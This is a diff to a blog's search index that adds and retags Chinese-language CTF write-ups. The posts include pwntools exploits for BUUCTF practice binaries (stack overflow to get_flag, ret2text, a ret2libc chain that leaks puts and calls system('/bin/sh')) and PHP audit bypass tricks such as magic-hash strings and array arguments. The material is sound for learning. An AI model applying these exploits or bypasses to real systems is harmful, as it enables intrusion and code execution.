@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[BUUCTF pwn做题记录]]></title>
+    <url>%2F2020%2F02%2F05%2FBUUCTFpwn%2F</url>
+    <content type="text"><![CDATA[BUUCTF pwn做题记录 get_started_3dsctf_2016思路首先file查看，是32位程序。checksec检查，只开启了nx 之后用ida查看，发现main函数中有明显溢出点gets 发现有获取flag的函数get_flag 所以思路就很明显了，将return address覆盖为get_flag的地址，再将参数传入，从而通过if判断，得到flag exp如下 12345678910111213from pwn import *#context.log_level = 'debug'sh = process('./get_started_3dsctf_2016')#gdb.attach(sh)num = 56address = 0x080489a0exit_address = 0x0804e6a0payload = 'A' * num + p32(address) + p32(exit_address) + p32(0x308cd64f) + p32(0x195719d1)# sh.recvline()sh.sendline(payload)#sh.recvline()sh.interactive() 这道题如果按这种方法做需要注意，因为最后程序是异常结束的(栈溢出)，并且没有遇到换行符，所以输出的flag仍处在缓冲区中，直接连接远程是无法看到结果的。我们可以再添加一个exit函数，使程序退出，从而将结果从缓冲区写入控制台中。 总结注意exit函数在这道题中的用途]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[pwn入门]]></title>
     <url>%2F2020%2F02%2F03%2Fpwn_baby%2F</url>
     <content type="text"><![CDATA[pwn的基础方法 引言师傅在入门课上提出了一个问题 1234567#include &lt;cstdio&gt;int main()&#123; double a=10; printf("%d",a); return 0;&#125; 这个程序在linux 64位环境下每次运行的结果都不相同，出乎我的意料。我最初的想法是将a的二进制位当做一个int来读取，只取前32位。但是这样结果应该是一个确定的值，而非每次都不相同。我们可以用gdb一探究竟。 步进到调用printf处，我们可以看到guessed arguments处只有一个arg[0]，即printf只有格式化字符串这个参数，变量a并没有被当做参数传入。因此，a中的值也没有被放到rsi寄存器里。最终，我们输出的是rsi中的值，这个值因受之前运算的影响而每次不同。 pwn基础方法推荐知乎上的一篇文章 手把手教你栈溢出从入门到放弃。其中具体讲解了栈溢出的原理和方法基础。我就结合几道简单题演示一下这些方法应该如何使用 shellcodeshellcode没找到合适的例子，暂且略过（这年头是程序基本都开nx保护） ret2text找到关键函数的位置，通过栈溢出将return address覆盖为关键函数的地址，从而获取flag 。 以buuctf上的rip为例,首先查看文件类型和保护。 确定是64位程序，没有开启各种保护。 之后ida查看一下大致运行的流程。 很明显，gets这个函数可以溢出。观察到有fun这个函数 所以思路很明显，我们通过gets将return address 覆盖为fun函数的地址，实现获取flag 先用gdb计算偏移得出偏移为23，然后查看ida找到call system及传入参数的指令的地址 之后构造如下payload 123456from pwn import *sh = process('./pwn1')payload = 'A' * 23 + p64(0x40118A)sh.sendline(payload)sh.interactive() 就可以通过cat flag得到flag ret2libc如果程序中没有给出system函数和’/bin/sh’字符串的话，前面的操作就无法实现。不过我们可以对libc中的system函数加以利用，实现和上面相似的效果 以buuctf上的ciscn_2019_c_1为例 首先查看类型和保护，发现开启了nx保护。 之后用ida反汇编，发现其中的encrypt函数存在溢出点。 我们首先要计算出libc的偏移，这可以通过puts函数来实现 12345678elf = ELF('./pwn')num = 0x58puts_got_address = elf.got['puts']puts_plt_address = 0x4006e0pop_rdi_address = 0x400c83start_main_address = elf.sym['main']payload = 'A' * num + p64(pop_rdi_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(start_main_address) 这个payload和之前的相比更加复杂。首先将pop_rdi;ret ;这条指令的地址覆写到return address，这样程序就会将rdi中的数据变成后面的puts_got_address,同时将rip变为puts在plt段中的地址。这样就可以实现puts输出puts这个函数在got表中的地址。最后的start_main_address是为了保证栈空间结构的正确性，即从头开始运行程序。 我们接收输出的地址，并利用这个地址和libc库比对，得到对应libc，从而计算出函数地址的偏移。 12345678910111213libc_puts_address = u64(sh.recvline()[:-1].ljust(8, '\0'))libc = LibcSearcher('puts', libc_puts_address)# 查找对应的libclibc_base = libc_puts_address - libc.dump('puts')# 计算函数地址的偏移system_address = libc_base + libc.dump('system')# 计算system函数的实际地址binsh_address = libc_base + libc.dump('str_bin_sh')# 计算/bin/sh这个字符串的实际地址payload = 'A' * num payload += p64(0x4006b9)# 添加一个ret指令保证字节对齐payload += p64(pop_rdi_address) + p64(binsh_address) + p64(system_address) 新payload的构造与上面的相似，最终实现调用system函数的目的。 总的exp为 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import *sh = remote('node3.buuoj.cn', 28331)#sh = process('./pwn')#gdb.attach(sh)elf = ELF('./pwn')num = 0x58puts_got_address = elf.got['puts']puts_plt_address = 0x4006e0pop_rdi_address = 0x400c83start_main_address = elf.sym['main']payload = 'A' * num + p64(pop_rdi_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(start_main_address)sh.sendlineafter('choice!\n', '1')sh.sendline(payload)sh.recvuntil('@')sh.recvline()libc_puts_address = u64(sh.recvline()[:-1].ljust(8, '\0'))libc = LibcSearcher('puts', libc_puts_address)libc_base = libc_puts_address - libc.dump('puts')system_address = libc_base + libc.dump('system')binsh_address = libc_base + libc.dump('str_bin_sh')payload = 'A' * num payload += p64(0x4006b9)payload += p64(pop_rdi_address) + p64(binsh_address) + p64(system_address)sh.sendlineafter('choice!\n', '1')sh.sendline(payload)sh.interactive()]]></content>
@@ -8,6 +20,7 @@
         <category>学习记录</category>
       </categories>
       <tags>
+        <tag>ctf</tag>
         <tag>pwn</tag>
       </tags>
   </entry>
@@ -63,7 +76,7 @@
     <url>%2F2019%2F09%2F12%2Fctf%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93%2F</url>
     <content type="text"><![CDATA[关于CTF常用工具的一些总结 1.ZipCenOp.jar用于判断压缩包是否为伪加密 指令:java -jar ZipCenOp.jar r xxx.zip decodejava -jar ZipCenOp.jar e xxx.zip encode 待续]]></content>
       <tags>
-        <tag>tools</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -71,6 +84,7 @@
     <url>%2F2019%2F09%2F11%2FPHPbug%2F</url>
     <content type="text"><![CDATA[php审计的常见漏洞 php审计—从入门到入坟 extract() extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。如果有重复则覆盖 效果:1234567&lt;?php$a = "a";$my_array = array("a" =&gt; "Cat","b" =&gt; "Dog", "c" =&gt; "Horse");extract($my_array);echo "\$a = $a; \$b = $b; \$c = $c";//$a=Cat $b=Dog $c=Horse?&gt; 通过变量覆盖解决问题。 strcmp() 在php5.3版本前，如果参数中传入非字符串内容，则直接return 0 伪造字符串相等 md5() 若要求md5值弱相等，则可构造哈希值为0E开头的字符串，此时直接视作为0。如果是强相等，则构造数组，此时返回NULL常见构造字符串: QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 注意是强相等还是弱相等 ereg() ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。如果参数为数组则返回NULL，遇到%00截断 strpos() 寻找表达式出现的第一个位置,如果参数为数组返回NULL 注意如果下标为0等价false is_numric() is_numric用于判断是否为纯数字，遇到%00直接判定为非数字，无关%00位置 ps:关于%00 %00是字符串的结尾，然而输出时遇到%00不停止。$_GET数组得到的是字符串，当出现 (string)1%00==1等类似语句时，会将string转换为数字，并且遇到%00停止。如果字符串无法转换为数字，就视作0。 update time:9.21 sha1() sha1()以数组为参数时，会返回NULL 比较转换 16进制与10进制比较，转换为10进制 附: strlen() strlen()以数组为参数时返回NULL eval() 该函数将接受的参数视作php语句，构造表达式闭合其括号 @$_GET[‘a’]这个不算bug,@的含义是忽略该表达式可能生成的错误消息 待续]]></content>
       <tags>
+        <tag>ctf</tag>
         <tag>php</tag>
       </tags>
   </entry>
